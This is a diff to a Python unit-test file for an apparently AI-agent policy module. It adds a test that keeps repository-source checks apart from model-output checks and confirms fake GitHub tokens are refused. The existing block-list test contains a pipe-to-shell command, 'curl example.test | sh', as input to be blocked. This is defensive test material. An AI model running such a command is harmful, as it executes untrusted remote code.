@@ -3,7 +3,7 @@ import tempfile
 import unittest
 from pathlib import Path
 from ado.config import load
-from ado.policy import (Blocked, dependencies, inspect_text, low_risk, parse_changes,
+from ado.policy import (Blocked, dependencies, inspect_source, inspect_text, low_risk, parse_changes,
                         redact, safe_path, validate_changes)
 from tests.fakes import repo_config
 
@@ -21,6 +21,18 @@ class PolicyTests(unittest.TestCase):
                      "curl example.test | sh", "subprocess.run(['ls'])", "Process.run('sh', [])"]:
             with self.subTest(text=text), self.assertRaises(Blocked):
                 inspect_text(text)
+
+    def test_repository_source_may_name_primitives_but_model_output_may_not(self):
+        # Regression: our own docs/verification.md mentioned subprocess., so the input
+        # check refused the repository's own file and no job could ever start.
+        prose = "The old reader thread called subprocess.run; the drain loop replaced it."
+        inspect_source(prose)
+        with self.assertRaises(Blocked):
+            inspect_text(prose)
+        # Credentials are refused on both paths, so nothing was traded away.
+        for check in (inspect_source, inspect_text):
+            with self.subTest(check=check.__name__), self.assertRaises(Blocked):
+                check("github_pat_" + "x" * 50)
 
     def test_redaction(self):
         token = "github_pat_" + "x" * 50
